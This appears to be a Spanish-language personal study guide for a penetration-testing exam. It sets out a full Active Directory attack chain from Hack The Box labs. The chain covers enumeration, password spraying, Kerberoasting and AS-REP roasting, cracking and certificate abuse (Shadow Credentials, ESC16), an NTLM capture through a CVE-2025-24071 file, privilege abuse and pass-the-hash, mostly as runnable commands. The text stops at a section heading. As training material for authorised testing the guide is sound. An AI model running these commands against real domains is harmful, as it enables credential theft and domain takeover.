# Guía Completa — Active Directory (de nmap a Domain Admin)

Documento único de flujo, construido y corregido tras 3 máquinas reales de práctica (HTB: Active, Forest, Sauna). Sigue el orden real de ataque a una máquina/set de AD. Cada comando tiene un comentario explicando **qué hace y por qué lo corres en ese momento**. Los bloques marcados con 🔴 son errores reales que salieron en práctica — no son hipotéticos, son los que de verdad te trabaron.

> Reglas del examen: Responder solo en modo análisis (nunca poisoning). Metasploit no sirve para pivotar. IA prohibida durante el examen real — esto es material de preparación.

---

## FASE 0 — Reconocimiento inicial (encontrar que es AD)

```bash
# rustscan es más rápido que nmap para el descubrimiento inicial de puertos.
rustscan -a <IP> --ulimit 5000 -- -sCV
```

```bash
# nmap puro — nunca te quedes solo con el top-1000
sudo nmap -p- --min-rate=5000 -T4 -Pn <IP> -oN nmap_allports.txt
sudo nmap -p<PUERTOS_ENCONTRADOS> -sCV -T4 -Pn <IP> -oN nmap_detail.txt
```

**Cómo saber que es Active Directory con solo mirar el nmap:**

| Puerto | Servicio | Por qué confirma AD |
|--------|----------|---------------------|
| 53 | DNS | AD suele ser su propio servidor DNS |
| 80/443 | HTTP(S) | Portales internos — a veces revelan nombres de empleados (ver Fase 1) |
| 88 | Kerberos | El protocolo de autenticación del dominio — ¡es un DC! |
| 135 | MSRPC | Llamadas a procedimiento remoto de Windows |
| 139/445 | SMB | Shares de red, enumeración de usuarios |
| 389/636 | LDAP / LDAPS | El directorio en sí |
| 464 | kpasswd | Cambio de contraseñas vía Kerberos |
| 3268/3269 | Global Catalog | Búsquedas across todo el forest |
| 5985/5986 | WinRM | Shell remota de PowerShell |
| 9389 | ADWS | AD Web Services |

```bash
# Descubrir el hostname/dominio real — NUNCA lo adivines
nxc smb <IP>
# Output: "(name:HOSTNAME) (domain:DOMINIO)" ← ESO es tu dominio real
```

```bash
# Agrega el DC a tu /etc/hosts INMEDIATAMENTE, con TODAS las formas del nombre.
# Sin esto, Kerberos y bloodhound-python fallan con errores de DNS confusos.
echo "<IP> <HOSTNAME>.<DOMINIO> <DOMINIO> <HOSTNAME>" | sudo tee -a /etc/hosts
# Ejemplo real: echo "10.129.74.144 SAUNA.EGOTISTICAL-BANK.LOCAL egotistical-bank.local SAUNA" | sudo tee -a /etc/hosts
```

> 🔴 **Error real visto en 2 de 3 máquinas:** si conectaste una VPN de un lab DISTINTO antes (ej: hiciste un módulo de Port Scanning y luego pasas a AD), tu `/etc/hosts` puede tener entradas VIEJAS de otro rango de IP que confunden todo. Revisa con `cat /etc/hosts` si hay entradas conflictivas antes de asumir que el problema es de la máquina actual.

---

## FASE 1 — Enumeración SIN credenciales

```bash
# Null session de SMB
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u 'guest' -p '' --shares

# RPC anónimo
rpcclient -U "" -N <IP>
#   enumdomusers     → lista usuarios del dominio
#   enumdomgroups    → lista grupos

# Enumeración automatizada combinada
enum4linux-ng -A <IP>

# LDAP con bind anónimo
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```

```bash
# Shares — busca nombres propios (no C$/ADMIN$/IPC$)
smbclient -L //<IP>/ -N
smbclient //<IP>/<share> -N
#   ls / cd <carpeta> / get <archivo>
#   prompt OFF; recurse ON; mget *   ← descarga TODO recursivamente
```

**Qué buscar en shares:** `Groups.xml` (GPP, ver Fase 2), scripts de login, backups, notas con credenciales.

### Enumeración de usuarios vía WEB (si el puerto 80/443 está abierto)

Una web con nombres de empleados es otra fuente de usuarios — obtienes **nombres completos**, no usernames, así que hay que convertirlos.

```bash
# Enumera la web normalmente, encuentra la página con nombres de empleados
whatweb http://<IP>/
feroxbuster -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Genera variantes de username con `username-anarchy`:**
```bash
git clone https://github.com/urbanadventurer/username-anarchy
cd username-anarchy
chmod +x username-anarchy

# Prueba con UN nombre primero para confirmar que funciona:
./username-anarchy John Smith
# → jsmith, john.smith, smithj, j.smith, johns, etc. (8-15 variantes por persona)
```

> 🔴 **Error real — heredoc de bash:** para crear un archivo con varios nombres de una vez, el bloque completo (incluyendo el `EOF` final) debe pegarse TODO JUNTO en la terminal, no línea por línea:
> ```bash
> cat <<EOF > nombres.txt
> Shaun Coins
> Sophie Driver
> Bowie Taylor
> EOF
> ```
> Verifica con `cat nombres.txt` que se creó bien antes de seguir.

> 🔴 **Error real — el loop generaba solo 1 variante por persona en vez de 10+:** la causa fue usar `while read -r linea` (una sola variable con "Nombre Apellido" junto) en vez de separar en dos campos. La versión que SÍ funciona:
> ```bash
> # MAL (genera solo 1 variante, rompe el paso de argumentos):
> while read -r linea; do ./username-anarchy $linea; done < nombres.txt
>
> # BIEN (separa nombre y apellido en variables distintas):
> while read -r nombre apellido; do ./username-anarchy "$nombre" "$apellido"; done < nombres.txt > users_generated.txt
> ```
> Confirma con `wc -l users_generated.txt` — debe ser MUCHO más que el número de personas (8-15x).

**Valida cuáles usernames generados existen REALMENTE en el dominio:**
```bash
nxc smb <IP> -u users_generated.txt -p '' 2>&1 | grep -v "STATUS_LOGON_FAILURE"
```

---

## FASE 2 — Explotación de hallazgos comunes SIN credenciales de dominio

### GPP / Group Policy Preferences — credenciales cifradas en Groups.xml

```bash
cat Groups.xml
# Busca el atributo cpassword="..." — cifrado con una clave AES que Microsoft
# publicó públicamente por error hace años. Cualquiera puede descifrarlo.

gpp-decrypt '<VALOR_DE_CPASSWORD>'
# Te da la contraseña en texto plano. Revisa el atributo "userName" del mismo
# XML para saber a qué cuenta pertenece.
```

### Password spraying con usuarios enumerados
```bash
nxc smb <IP> -u users.txt -p ''
nxc smb <IP> -u users.txt -p 'Password123'
# OJO: puede bloquear cuentas si hay política de lockout agresiva.
```

---

## FASE 3 — Ya tienes UNA credencial de dominio (foothold en AD)

```bash
# 1. Confirma DÓNDE funcionan, escaneando el RANGO completo, no solo el DC
nxc smb <SUBNET>/24 -u '<user>' -p '<pass>'
# Busca "(Pwn3d!)" — significa admin local en esa máquina específica.
```

```bash
# 2. Enumeración con credenciales — mucho más rica que la anónima
nxc smb <IP> -u '<user>' -p '<pass>' --users
nxc smb <IP> -u '<user>' -p '<pass>' --groups
nxc smb <IP> -u '<user>' -p '<pass>' --shares
```

```bash
# 3. LDAP con credenciales y filtros específicos
# Básico: usuarios Y computadoras mezclados (las de máquina terminan en $)
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(objectClass=user)" sAMAccountName -LLL

# Filtro para EXCLUIR cuentas de computadora:
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(&(objectClass=user)(!(objectClass=computer)))" sAMAccountName -LLL

# Cuentas con SPN configurado (candidatas a Kerberoasting) — anticipa el vector:
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName -LLL
```

```bash
# 4. RPC con credenciales — canal DISTINTO a LDAP, a veces revela usuarios que LDAP no
rpcclient -U "<user>%<pass>" <IP> -c "enumdomusers" | grep -oP '(?<=\[)[^\]]+(?=\] rid)' > users_rpc.txt
```

> 🔴 **Lección real (pasó en Forest):** AS-REP Roasting no encontraba ningún usuario vulnerable con la lista de LDAP. Al cruzar contra la lista de RPC, aparecieron 2 usuarios (`lucinda`, `mark`) que LDAP anónimo no había mostrado — el bind anónimo de LDAP puede tener restricciones de visibilidad que RPC/SAMR no tiene.
> ```bash
> diff <(sort users_ldap.txt) <(sort users_rpc.txt)
> ```
> **Siempre cruza al menos 2 fuentes de enumeración de usuarios antes de asumir que tu lista está completa.**

---

## FASE 4 — BloodHound (el mapa completo del dominio)

### Instalación
```bash
sudo apt install bloodhound -y
bloodhound-start
# Primera vez pide bloodhound-setup (acepta "y"). Abre Neo4j en :7474
# (paso INTERMEDIO, no la interfaz final) y te da user admin + pass para :8080.
```

### 🔴 Checklist de arranque si BloodHound no responde
Esto costó más de 30 minutos reales de diagnóstico — sigue este orden exacto:

```bash
# 1. ¿Ya está arriba, o la terminal solo parece colgada?
curl -s http://localhost:8080/ui/login -o /dev/null -w "%{http_code}\n"
# 200 = ya está arriba. 000 = sigue caído.

# 2. LA CAUSA #1 MÁS COMÚN: Postgres "parece" activo pero NO lo está.
#    systemctl status postgresql puede decir "active (exited)" — ESO ES MENTIRA,
#    es solo un servicio meta. Verifica la instancia REAL:
sudo pg_lsclusters
# Si Status dice "down":
sudo pg_ctlcluster <VERSION_EXACTA_MOSTRADA> main start
# ejemplo real: sudo pg_ctlcluster 18 main start

# 3. Confirma Neo4j por separado:
ps aux | grep neo4j
sudo neo4j start    # si no hay proceso vivo (usa "start", no "console", para no bloquear la terminal)

# 4. Reinicia el backend y confirma:
sudo systemctl restart bloodhound
sudo journalctl -u bloodhound -n 20 --no-pager -o cat   # -o cat evita que se corte el mensaje de error
curl -s http://localhost:8080/ui/login -o /dev/null -w "%{http_code}\n"
```

### Generar y subir los datos
```bash
# -d es el DOMINIO (NO -g, rompe la resolución DNS)
# --zip es específico de BloodHound CE
bloodhound-python -u <user> -p <pass> -d <dominio> -ns <DC_IP> -c all --zip
```

> 🔴 **Corre esto SIEMPRE desde tu propia carpeta de trabajo** (`cd ~/htbmachines` o similar), nunca desde `/` — puede fallar con `PermissionError: [Errno 13] Permission denied` al intentar escribir los `.json` en un directorio sin permisos de escritura para tu usuario.

> 🔴 **Si falla con `Name or service not known` o resuelve IPs IPv6 raras (`dead:beef::...`):** agrega el DC a `/etc/hosts` primero (Fase 0) y usa `-dc <HOSTNAME_COMPLETO>` explícito:
> ```bash
> bloodhound-python -u <user> -p <pass> -d <dominio> -ns <DC_IP> -dc <HOSTNAME>.<dominio> -c all --zip
> ```

> 🔴 **Si falla con `KRB_AP_ERR_SKEW (Clock skew too great)`:** tu reloj de Kali está desincronizado con el del DC (Kerberos es muy estricto con el tiempo). Sincroniza:
> ```bash
> sudo ntpdate <DC_IP>
> # o si no tienes ntpdate: sudo timedatectl set-ntp true
> ```
> En la práctica, la herramienta suele caer automáticamente a NTLM y seguir funcionando igual — no siempre es bloqueante.

> 🔴 **Si da error LDAP `data 52e` (LOGON_FAILURE):** NO es un problema de BloodHound, son las credenciales. Señal de alerta clave: **si 2+ protocolos distintos (SMB, LDAP, WinRM) rechazan la MISMA credencial de forma consistente, sospecha del dato copiado, no de la técnica.** Reescribe usuario y password A MANO, sin copiar/pegar.

Sube el `.zip` en `localhost:8080` → menú lateral → ícono de subida ("Upload Files" / "Quick Upload").

### Navegación — 3 pestañas
- **SEARCH**: busca tu usuario, revisa "Object Information" (¿Kerberoastable? ¿AS-REP roasteable? ¿Allows Unconstrained Delegation?).
- **PATHFINDING**: Start Node = tu usuario, End Node = `DOMAIN ADMINS@<DOMINIO>`. Más simple que Cypher, no necesita marcar "Owned".
- **CYPHER**: solo lectura en BloodHound CE (no `SET` para marcar Owned — usa Pathfinding).

```cypher
// Todos los edges de un tipo específico en todo el dominio
MATCH p=(n)-[:WriteDacl]->(m) RETURN p

// Cuentas Kerberoastable de un vistazo
MATCH (n:User {hasspn:true}) RETURN n
```

**Prioriza por familia de edge, no por número de saltos:**
```
1. ACL (GenericAll, WriteDacl, WriteOwner, AddMember, GetChanges/GetChangesAll...)
   → ejecutable YA, sin depender de nada más
2. Kerberos (Kerberoastable, AS-REPRoastable)
   → ejecutable YA, pero depende de crackear el hash
3. Sesión (HasSession, AdminTo hacia máquina que NO controlas)
   → esconde trabajo previo no mostrado en el grafo
```
**Ojo con la dirección de la flecha:** un edge DESDE un grupo administrativo HACIA tu usuario es la relación normal (te administran a ti) — no explotable. Solo importa si sale DESDE tu nodo HACIA el objetivo.

> **Nota real:** no todos los caminos son cadenas largas. En una máquina, `svc_loanmgr` tenía `GetChangesAll` **directo sobre el dominio, 1 solo salto** — sin ninguna cadena de grupos. Siempre revisa Pathfinding primero antes de asumir que necesitas una cadena compleja como en el ejemplo de Fase 8.

---

## FASE 5 — Ataques de Kerberos

```bash
# ── AS-REP Roasting ── (GetNPUsers, "NP" = No Preauth)
# Ataca cuentas con "Do Not Require Pre-Authentication" = TRUE.
# NO necesitas password válido si usas -usersfile con -no-pass.
impacket-GetNPUsers <dominio>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
# Hash: $krb5asrep$23$... → hashcat -m 18200

# ── Kerberoasting ── (GetUserSPNs, "SPN" = Service Principal Name)
# Ataca cuentas de SERVICIO (nombres tipo SVC_*) con SPN configurado.
# SÍ necesitas credenciales válidas de antemano.
impacket-GetUserSPNs <dominio>/<user>:<pass> -dc-ip <DC_IP> -request
# Hash: $krb5tgs$23$... → hashcat -m 13100
```

> 🔴 **CONFUSIÓN REAL más frecuente de las 3 máquinas:** `GetNPUsers` (AS-REP) y `GetUserSPNs` (Kerberoasting) atacan vulnerabilidades DISTINTAS en cuentas DISTINTAS. Si corres `GetNPUsers` y ves `"User X doesn't have UF_DONT_REQUIRE_PREAUTH set"` para TODOS tus usuarios, no es que el comando esté mal — significa que NINGUNO es AS-REP roasteable, y probablemente necesitas `GetUserSPNs` en su lugar (especialmente si ves cuentas con nombre `SVC_*`).
> **Regla mental:** nombre de cuenta de servicio (`SVC_algo`) → piensa Kerberoasting primero, no AS-REP.

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

---

## FASE 5b — Credenciales en archivos comprimidos/certificados (ZIP, PFX)

Caso real completo (máquina Timelapse). A veces un share SMB tiene un `.zip` protegido con password, y dentro un archivo `.pfx` (certificado + clave privada) que **también** está protegido con su propia password — dos capas de cracking antes de poder usar nada.

```bash
# 1. Crackear el ZIP
zip2john archivo.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt    # o: cat ~/.john/john.pot

unzip archivo.zip
# te pedirá la password que acabas de crackear
```

```bash
# 2. Un .pfx (certificado personal, formato PKCS#12) suele tener SU PROPIA password
pfx2john archivo.pfx > pfx_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=pfx pfx_hash.txt
john --show --format=pfx pfx_hash.txt
```

### Convertir el PFX en cert + key para usarlo con evil-winrm

Un `.pfx` contiene certificado Y clave privada juntos — para autenticar con evil-winrm necesitas **separarlos** en dos archivos:

```bash
# Extrae la clave privada (key.pem) — necesitas la password del pfx que ya crackeaste
openssl pkcs12 -in archivo.pfx -nocerts -out key.pem -nodes
# Te pedirá la "Import Password" → es la password del pfx (ej: "thuglegacy")

# Extrae el certificado (cert.pem) — misma password
openssl pkcs12 -in archivo.pfx -clcerts -nokeys -out cert.pem
```
> `-nodes` en el primer comando = no cifrar la clave privada de salida (para no tener que meter otra password extra al usarla). `-nocerts`/`-clcerts` es lo que separa cert de key.

### Conectar con evil-winrm usando certificado (autenticación de cliente TLS, no usuario/password)

```bash
evil-winrm -i <IP> -c cert.pem -k key.pem -S
```
- `-c` → el certificado
- `-k` → la clave privada
- `-S` → SSL (este tipo de auth por certificado casi siempre corre sobre WinRM+TLS, puerto 5986)

**Esto autentica como el usuario al que pertenece ese certificado** (en el caso real, `legacyy`) — no necesitas su password en texto plano en absoluto, el certificado ES la credencial.

---

## FASE 5c — Credenciales en el historial de PowerShell (post-explotación, "qué hacer una vez dentro")

Una vez con shell, antes de pasar a winPEAS automatizado, revisa manualmente el historial de comandos del usuario — a veces alguien escribió una password en texto plano sin querer dejarla ahí:

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
Busca líneas con `ConvertTo-SecureString`, `PSCredential`, o cualquier password/usuario visible. Es un archivo que PowerShell mantiene automáticamente con cada comando que el usuario tecleó en sesiones anteriores — muy común encontrar ahí credenciales de otra cuenta usadas para pruebas.

---

## FASE 5d — LAPS (Local Administrator Password Solution)

**Qué es:** Microsoft LAPS asigna una password de Administrador **local** distinta y rotada automáticamente a cada máquina del dominio, guardándola cifrada en un atributo de AD (`ms-Mcs-AdmPwd` en la versión clásica). Si tu usuario tiene permiso de lectura sobre ese atributo, LAPS te da esa password en texto plano — no es una vulnerabilidad de LAPS en sí, es un permiso de lectura mal otorgado.

```bash
# Forma más rápida y directa — módulo dedicado de nxc
nxc ldap <IP> -u '<user>' -p '<pass>' -M laps
# Output: Computer:<HOSTNAME>$ User: Password:<password_texto_plano>
```

**Alternativas si `nxc -M laps` no está disponible:**
```powershell
# Desde una shell de Windows, con PowerShell nativo (necesita el módulo AD o RSAT)
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
# Busca en el output: ms-Mcs-AdmPwd (la password) y ms-Mcs-AdmPwdExpirationTime
```
```bash
# O vía LDAP directo
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(objectClass=computer)" ms-Mcs-AdmPwd -LLL
```

**Con la password de LAPS obtenida — es del Administrador LOCAL de esa máquina específica, no del dominio:**
```bash
evil-winrm -i <IP> -u 'Administrator' -p '<password_de_laps>' -S
```

> **Con shell de Administrator, ya tienes acceso a TODO el sistema de archivos** — no necesitas "las credenciales de" ningún otro usuario para leer su flag. Simplemente navega a su carpeta:
> ```powershell
> dir C:\Users\<otro_usuario>\Desktop
> type C:\Users\<otro_usuario>\Desktop\root.txt
> ```
> No confundas "la flag está en el Desktop de X" con "necesito loguearme como X" — Administrator puede leer cualquier carpeta del sistema sin importar de quién sea.

---

## FASE 2b — Captura de hash vía archivo malicioso en un share (CVE-2025-24071, estilo library-ms)

Caso real (máquina Fluffy). Si encuentras un share SMB donde tienes permiso de **escritura**, y el PDF/notas de la máquina mencionan una CVE de "File Explorer Spoofing" o similar relacionada con `.library-ms`, el ataque es: subir un archivo especialmente armado que, cuando alguien (un proceso automatizado del dominio) lo indexa/abre, dispara una autenticación SMB hacia TU máquina — capturas su hash NTLMv2 sin que nadie haga click en nada de forma consciente.

```bash
# 1. Confirma que tienes escritura en el share (no solo lectura)
smbclient //<IP>/<share> -U '<user>'
smb: \> put archivo_prueba.txt    # si funciona, tienes escritura

# 2. Prepara el archivo malicioso (ej: con el PoC de la CVE específica)
# Busca el PoC exacto de la CVE que te señale el enunciado — suele ser un script
# que empaqueta un .library-ms dentro de un .zip con una ruta UNC apuntando a ti.
```

```bash
# 3. Levanta un listener para capturar la autenticación entrante
sudo responder -I tun0
# NOTA: en este caso Responder se usa como LISTENER pasivo para capturar la
# autenticación que el propio exploit provoca — no es poisoning de LLMNR/NBT-NS
# broadcast. Aun así, verifica la política exacta antes de usar esto en el
# examen real; el principio seguro es "solo modo análisis" salvo que el vector
# sea explícitamente parte de la cadena de un CVE específico documentado.
```

```bash
# 4. Sube el archivo malicioso al share con escritura
smbclient //<IP>/<share> -U '<user>' -c "put malicious.zip"
```

**Resultado esperado:** Responder captura un hash NetNTLMv2 de algún usuario del dominio. Crackéalo:
```bash
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

---

## FASE 5f — Shadow Credentials (abuso de GenericWrite/GenericAll sobre una cuenta)

Caso real (máquina Fluffy). Si BloodHound muestra que tienes `GenericWrite` o `GenericAll` sobre una cuenta (no un grupo, una cuenta de usuario/servicio específica), una alternativa a resetear su password (que a veces rompe cosas o es detectado) es el ataque de **Shadow Credentials**: agregas tu propia "credencial de certificado" al atributo `msDS-KeyCredentialLink` de esa cuenta, lo que te permite autenticar como ella usando un certificado que TÚ generaste, sin tocar su password en absoluto.

```bash
# Con certipy (ya lo necesitas para la fase de AD CS, así que es la misma herramienta)
certipy shadow auto -u '<tu_usuario>@<dominio>' -p '<tu_pass>' -dc-ip <DC_IP> -account '<cuenta_objetivo>'
```
Esto te genera un certificado y, con él, recupera el **hash NT** de la cuenta objetivo directamente — sin necesitar crackear nada, sin resetear su password.

**Alternativa con `pywhisker`** (si `certipy shadow` no está disponible o da error):
```bash
python3 pywhisker.py -d '<dominio>' -u '<tu_usuario>' -p '<tu_pass>' --target '<cuenta_objetivo>' --action add
```

> 🔴 **Si certipy da error de reloj/tiempo al autenticar** (`KRB_AP_ERR_SKEW` u otro error de validez de certificado), antepón `faketime` sincronizado con el reloj del DC a CUALQUIER comando de certipy que falle por esto:
> ```bash
> faketime "$(ntpdate -q <DC_IP> | awk '{print $1" "$2}')" certipy shadow auto -u '...' -p '...' -dc-ip <DC_IP> -account '...'
> ```
> Esto pasa seguido con certificados porque son mucho más estrictos con la hora que NTLM — un desfase de unos minutos entre tu Kali y el DC puede invalidar el certificado completo, aunque todo lo demás esté bien.

**Con el hash NT obtenido, movimiento lateral normal (Fase 6):**
```bash
evil-winrm -i <IP> -u '<cuenta_objetivo>' -H '<NT_HASH>'
```

### Alternativa cuando `net rpc`/`ldapmodify` fallan para unirte a un grupo — `bloodyAD`

Ya documentamos en Fase 8 que `net rpc group addmem` puede fallar silenciosamente, y la alternativa era LDAP directo (`ldapmodify`). **`bloodyAD`** es otra alternativa, más simple de usar cuando funciona (requiere resolver antes el conflicto de dependencias de `cryptography` — ver nota en Fase 8):
```bash
bloodyAD -u '<tu_usuario>' -p '<tu_pass>' -d <dominio> --host <DC_IP> add groupMember '<GRUPO>' '<tu_usuario>'
```

---

## FASE 8c — Active Directory Certificate Services (AD CS) / ESC16 con Certipy

**Qué es AD CS:** un servicio de Windows que emite certificados digitales dentro del dominio. Mal configurado, un certificado puede usarse para **autenticar como cualquier usuario** (incluido Administrator) sin conocer su password — es un vector de escalada completo, paralelo a DCSync/ACL, y cada vez más común en máquinas/examen recientes.

**ESC16 específicamente:** la CA (Certificate Authority) tiene deshabilitada una "extensión de seguridad" que normalmente ata el certificado emitido al SID de la cuenta que lo pidió. Sin esa extensión, puedes **cambiar el UPN (User Principal Name) de una cuenta que ya controles** (ej: una cuenta de servicio donde conseguiste el hash vía Shadow Credentials) a `administrator`, pedir un certificado para esa cuenta, y el certificado resultante sirve para autenticar como el Administrator real.

```bash
# 1. Enumera si la CA tiene ESC16 (o cualquier otra vulnerabilidad de plantillas)
certipy find -u '<cuenta_con_hash>@<dominio>' -hashes ':<NT_HASH>' -dc-ip <DC_IP> -vulnerable -enabled -stdout
# Busca en el output: "ESC16 : Security Extension is disabled."
```

```bash
# 2. Cambia el UPN de tu cuenta controlada a "administrator"
#    (esto es lo que hace que el certificado, al pedirse, quede vinculado a esa identidad)
certipy account update -u '<cuenta_con_hash>@<dominio>' -hashes ':<NT_HASH>' -user '<cuenta_con_hash>' -upn 'administrator' -dc-ip <DC_IP>
```

```bash
# 3. Pide el certificado como esa cuenta (ahora con UPN "administrator")
certipy req -u '<cuenta_con_hash>' -hashes ':<NT_HASH>' -dc-ip <DC_IP> -target <HOSTNAME_FQDN_DC> -ca '<NOMBRE_CA>' -template 'User'
# Te genera administrator.pfx
```

```bash
# 4. Autentica con ese certificado para obtener el hash NT real de Administrator
#    (de nuevo, si hay desfase de reloj, antepón faketime)
certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <dominio>
```

```bash
# 5. IMPORTANTE — restaura el UPN de la cuenta que modificaste a su valor original
#    cuando termines, es buena práctica (y a veces necesario para no romper otra cosa)
certipy account update -u '<cuenta_con_hash>' -hashes ':<NT_HASH>' -user '<cuenta_con_hash>' -upn '<cuenta_con_hash>@<dominio>' -dc-ip <DC_IP>
```

**Con el hash NT de Administrator obtenido en el paso 4 — Pass-the-Hash normal (Fase 9).**

> 🔴 **Usa SIEMPRE la versión más reciente de `certipy`.** Varios writeups de esta misma máquina mencionan explícitamente que versiones viejas de certipy no detectan ESC16 correctamente o fallan en el flujo. Actualiza antes de asumir que la técnica no aplica:
> ```bash
> pip install certipy-ad --upgrade --break-system-packages
> # o, si usas venv (recomendado dado los conflictos de cryptography ya documentados):
> python3 -m venv ~/venv-certipy && source ~/venv-certipy/bin/activate && pip install certipy-ad
> ```

> **Cadena completa de la máquina real que motivó esta sección:** share con escritura → CVE-2025-24071 + Responder → hash de un usuario #1 → ACL (`GenericWrite`) sobre cuentas de servicio → Shadow Credentials → hash de cuenta de servicio #2 (`ca_svc`) → `certipy find` revela ESC16 → cambiar UPN → pedir certificado → `certipy auth` (con `faketime` si hace falta) → hash de Administrator.

---

## FASE 5e — Abuso de `SeBackupPrivilege` (leer archivos protegidos sin ser Administrator)

Caso real (máquina Return). Ves en `whoami /priv` que tienes `SeBackupPrivilege Enabled`, y como Administrator es propietario de un archivo (ej: `root.txt` en su Desktop), intentas leerlo con `type`/`Get-Content` y da `Access is denied` — **incluso descargándolo con evil-winrm `download` llega vacío (0 bytes)**.

> 🔴 **Lección clave: tener un privilegio "Enabled" en el token NO significa que se aplique automáticamente a cualquier comando.** `SeBackupPrivilege` solo se activa cuando usas una herramienta que invoca explícitamente la semántica de "backup" de la API de Windows — eso es lo que le dice al sistema "ignora la ACL normal, esto es una operación de respaldo". `type`, `Get-Content`, `cat`, y el `download` normal de evil-winrm NO activan esa semántica — por eso fallan o traen el archivo vacío, aunque el privilegio esté ahí.

**Solución más simple — `robocopy` con el flag `/B` (modo backup):**
```powershell
robocopy C:\Users\Administrator\Desktop C:\Users\<tu_usuario>\Documents\loot root.txt /B
```
El `/B` le dice a robocopy que use la API de backup de Windows, que SÍ respeta `SeBackupPrivilege` y copia el archivo saltándose la ACL normal del propietario.

**Luego, léelo normal desde tu propia carpeta (ya no tiene la ACL restrictiva del original):**
```powershell
type C:\Users\<tu_usuario>\Documents\loot\root.txt
```

**Alternativa con módulo dedicado** (si `robocopy /B` no coopera, o necesitas volcar algo más sensible tipo SAM/SYSTEM/NTDS):
```powershell
# Sube SeBackupPrivilegeCmdLets.dll y SeBackupPrivilegeUtils.dll (recuerda: barras "/" con upload de evil-winrm)
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\ruta\destino\root.txt
```

**Otros privilegios que aparecen junto a `SeBackupPrivilege` y para qué sirven** (útil reconocerlos en `whoami /priv`, mismo patrón: "Enabled" no basta, necesitas la herramienta correcta):
- `SeRestorePrivilege` → escribir/sobreescribir archivos saltándose ACL (complemento de Backup, para escalar más allá de solo leer).
- `SeLoadDriverPrivilege` → cargar drivers en modo kernel (vector de privesc distinto, vía drivers vulnerables).
- `SeTakeOwnershipPrivilege` → tomar posesión de cualquier objeto, similar en efecto a WriteOwner en AD pero a nivel de sistema de archivos local.

---

## FASE 6 — Movimiento lateral

```bash
# ANTES de elegir herramienta, confirma qué puerto está abierto
nmap -p445,5985,5986 <IP>
```

```bash
# Si 5985/5986 (WinRM) abierto → evil-winrm
evil-winrm -i <IP> -u <user> -p <pass>
evil-winrm -i <IP> -u <user> -H <NT_HASH>          # Pass-the-Hash

# Si 5985 CERRADO pero 445 abierto → impacket-psexec o wmiexec
impacket-psexec  <dominio>/<user>:<pass>@<IP>      # crea un servicio (más ruidoso)
impacket-wmiexec <dominio>/<user>:<pass>@<IP>      # vía WMI (más discreto)
```

> 🔴 **Señal de alerta #1 — `Errno::ECONNREFUSED` en 5985:** el puerto está cerrado. Cambia inmediatamente a psexec/wmiexec, no reintentes evil-winrm.

> 🔴 **Señal de alerta #2 — WinRM conecta (ves el prompt `PS C:\>`) pero CUALQUIER comando da `WinRMAuthorizationError`:** las credenciales son correctas, pero ese usuario NO está en el grupo "Remote Management Users". Vi esto pasar en 2 de 3 máquinas, con 2 cuentas de servicio distintas (`svc-alfresco` en Forest, y otro caso en Sauna). **No es un error tuyo — esa cuenta simplemente no tiene autorización de ejecución vía WinRM, aunque autentique.** Prueba con SMB (psexec/wmiexec) en su lugar; si SMB también rechaza (`STATUS_LOGON_FAILURE`), no es autorización, son las credenciales (ver alerta #3).

> 🔴 **Señal de alerta #3 — 2+ protocolos distintos (SMB, LDAP, WinRM) rechazan la MISMA credencial de forma consistente con LOGON_FAILURE:** sospecha del dato copiado, no de la configuración. Reescribe usuario Y password a mano.

> 🔴 **Señal de alerta #4 — `--local-auth`:** si sospechas que la cuenta es LOCAL de la máquina (no de dominio), prueba:
> ```bash
> nxc smb <IP> -u '<user>' -p '<pass>' --local-auth
> nxc winrm <IP> -u '<user>' -p '<pass>' --local-auth
> ```
> Si Kerberos da `KDC_ERR_C_PRINCIPAL_UNKNOWN (Client not found in Kerberos database)`, el principal no existe como cuenta de DOMINIO con ese nombre exacto — verifica el username (ver Fase 7).

---

## FASE 7 — Enumeración nativa desde dentro (RDP + PowerShell/.NET, sin nxc/impacket)

Útil cuando: el firewall solo deja pasar RDP/WinRM (no SMB/RPC desde fuera), o ya tienes shell y quieres enumerar sin depender de herramientas externas ni dejar binarios en disco.

```bash
xfreerdp /u:<user> /d:<dominio> /v:<IP_cliente> +clipboard
# Si da error de Kerberos "Cannot contact any KDC", agrega el DC a tu /etc/hosts (Fase 0)
```

```cmd
:: Usuarios y grupos DEL DOMINIO (no confundir con los locales de abajo)
net user /domain
net group "Domain Admins" /domain

:: Usuarios y grupos LOCALES de la máquina donde estás parado (¡distinto!)
net user
net localgroup administrators
```
> 🔴 **Confusión real:** `net user` (sin `/domain`) solo muestra cuentas LOCALES de esa máquina, no del dominio.

### PowerShell + .NET classes — construir la ruta LDAP dinámicamente

